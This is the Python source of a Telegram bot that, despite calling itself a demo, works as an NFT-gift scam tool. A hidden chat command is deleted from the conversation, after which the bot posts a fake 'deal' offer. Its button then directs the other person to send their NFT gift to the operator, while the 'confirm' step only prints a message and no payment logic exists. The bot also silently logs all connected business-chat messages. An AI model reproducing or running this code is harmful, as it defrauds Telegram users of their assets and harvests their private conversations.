import asyncio
import datetime
import json
import os
import random
import re
import string

from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BusinessConnection,
)

from config import BOT_TOKEN, BOT_USERNAME
from texts import TEXTS

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

CONN_FILE = "connections.json"
LOG_FILE = "messages.log"


def load_json(path: str) -> dict:
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"[LOAD ERROR] {path}: {e}")
    return {}


def save_json(path: str, data: dict):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[SAVE ERROR] {path}: {e}")


def log_message(chat_id: int, username: str | None, text: str):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    username_str = f"@{username}" if username else "—"
    line = f"[{timestamp}] chat_id={chat_id} user={username_str} text={text!r}\n"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception as e:
        print(f"[LOG ERROR] {e}")


# ---------- Хранилища ----------

pending_deals: dict[int, dict] = {}

business_connections: dict[int, str] = {
    int(k): v for k, v in load_json(CONN_FILE).items()
}

known_users: dict[str, int] = {}


# ---------- Premium-эмодзи ----------
EMOJI_ACCEPT = "5774022692642492953"
EMOJI_DECLINE = "5774077015388852135"
EMOJI_GIFT = "5774022692642492953"      # замени
EMOJI_CONFIRM = "5774022692642492953"   # замени


# ---------- Кнопки ----------

def offer_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=t["btn_accept"],
            callback_data="deal:accept",
            icon_custom_emoji_id=EMOJI_ACCEPT,
        ),
        InlineKeyboardButton(
            text=t["btn_decline"],
            callback_data="deal:decline",
            icon_custom_emoji_id=EMOJI_DECLINE,
        ),
    ]])


def deal_kb(lang: str, target_username: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    gift_url = f"tg://send_gift?to={target_username}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=t["btn_give"],
            url=gift_url,
            icon_custom_emoji_id=EMOJI_GIFT,
        )],
        [InlineKeyboardButton(
            text=t["btn_confirm"],
            callback_data="deal:confirm",
            icon_custom_emoji_id=EMOJI_CONFIRM,
        )],
    ])


# ---------- Утилиты ----------

def parse_gift_name(link: str) -> str:
    slug = link.rstrip("/").split("/")[-1]
    if "-" in slug:
        name, num = slug.rsplit("-", 1)
        name = re.sub(r"(?<!^)(?=[A-Z])", " ", name)
        title = f"{name} #{num}"
    else:
        title = slug
    return f'<a href="{link}">{title}</a>'


def gen_order_id() -> str:
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choices(chars, k=10))


def detect_lang(code: str | None) -> str:
    if code in ("ru", "en", "cn"):
        return code
    return "ru"


# ---------- Бизнес-подключение ----------

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    if connection.is_enabled:
        business_connections[connection.user.id] = connection.id
        save_json(CONN_FILE, {str(k): v for k, v in business_connections.items()})
        print(f"[BUSINESS] ✅ Подключён: user_id={connection.user.id}")
    else:
        business_connections.pop(connection.user.id, None)
        save_json(CONN_FILE, {str(k): v for k, v in business_connections.items()})
        print(f"[BUSINESS] ❌ Отключён: user_id={connection.user.id}")


# ---------- Регулярка ----------

COMMAND_RE = re.compile(
    rf"@{re.escape(BOT_USERNAME)}\s+(?P<link>\S+)\s+(?P<amount>\d+)(?:\s+(?P<lang>ru|en|cn))?\s*$",
    re.IGNORECASE,
)


# ---------- Ловим сообщения в бизнес-чатах ----------

@dp.business_message()
async def on_business_message(message: types.Message):
    chat_id = message.chat.id
    username = message.from_user.username if message.from_user else None
    text = message.text or ""

    log_message(chat_id, username, text)
    print(f"[BUSINESS MSG] chat_id={chat_id}, @{username}: {text!r}")

    if not text:
        return

    m = COMMAND_RE.match(text)
    if not m:
        return

    print(f"[BUSINESS MATCH] {m.groupdict()}")

    connection_id = business_connections.get(message.from_user.id)
    if not connection_id:
        print(f"[WARN] Нет connection_id для {message.from_user.id}")
        return

    # ⚠️ УДАЛЯЕМ сообщение с командой
    try:
        await bot.delete_business_messages(
            business_connection_id=connection_id,
            message_ids=[message.message_id],
        )
        print(f"[DELETE] ✅ Удалено сообщение {message.message_id}")
    except Exception as e:
        print(f"[DELETE ERROR] {e}")

    link = m.group("link")
    amount = int(m.group("amount"))
    lang = detect_lang(m.group("lang"))

    gift_name = parse_gift_name(link)
    order_id = gen_order_id()
    target_username = username or ""

    pending_deals[chat_id] = {
        "amount": amount,
        "gift_name": gift_name,
        "buyer_username": message.from_user.username or message.from_user.full_name,
        "target_username": target_username,
        "order_id": order_id,
        "connection_id": connection_id,
        "lang": lang,
    }

    t = TEXTS[lang]

    try:
        await bot.send_message(
            chat_id=chat_id,
            text=t["offer"].format(amount=amount, gift_name=gift_name),
            reply_markup=offer_kb(lang),
            business_connection_id=connection_id,
        )
        print(f"[BUSINESS SEND] ✅ Отправлено в чат {chat_id}, lang={lang}")
    except Exception as e:
        print(f"[ERROR] {e}")


# ---------- /start ----------

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    u = message.from_user
    if u.username:
        known_users[u.username.lower()] = u.id

    await message.answer(
        "Привет! Я демо-бот.\n\n"
        f"Чтобы создать сделку, напиши в чате с человеком:\n"
        f"<code>@{BOT_USERNAME} https://t.me/nft/TamaGadget-54831 444 ru</code>\n"
        f"<code>@{BOT_USERNAME} https://t.me/nft/TamaGadget-54831 444 en</code>\n"
        f"<code>@{BOT_USERNAME} https://t.me/nft/TamaGadget-54831 444 cn</code>"
    )


# ---------- Callbacks ----------

@dp.callback_query(F.data == "deal:accept")
async def on_accept(call: types.CallbackQuery):
    deal = pending_deals.get(call.message.chat.id)
    if not deal:
        await call.answer("Not found", show_alert=True)
        return

    lang = deal.get("lang", "ru")
    t = TEXTS[lang]

    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(
        t["deal"].format(
            order_id=deal["order_id"],
            amount=deal["amount"],
            buyer_username=deal["buyer_username"],
            gift_name=deal["gift_name"],
        ),
        reply_markup=deal_kb(lang, deal.get("target_username", "")),
    )
    await call.answer()


@dp.callback_query(F.data == "deal:decline")
async def on_decline(call: types.CallbackQuery):
    deal = pending_deals.pop(call.message.chat.id, None)
    lang = deal.get("lang", "ru") if deal else "ru"
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(TEXTS[lang]["declined"])
    await call.answer()


@dp.callback_query(F.data == "deal:confirm")
async def on_confirm(call: types.CallbackQuery):
    deal = pending_deals.pop(call.message.chat.id, None)
    lang = deal.get("lang", "ru") if deal else "ru"
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(TEXTS[lang]["confirm_msg"])
    await call.answer()


# ---------- Запуск ----------

async def main():
    print(f"Бот запущен. BOT_USERNAME=@{BOT_USERNAME}")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())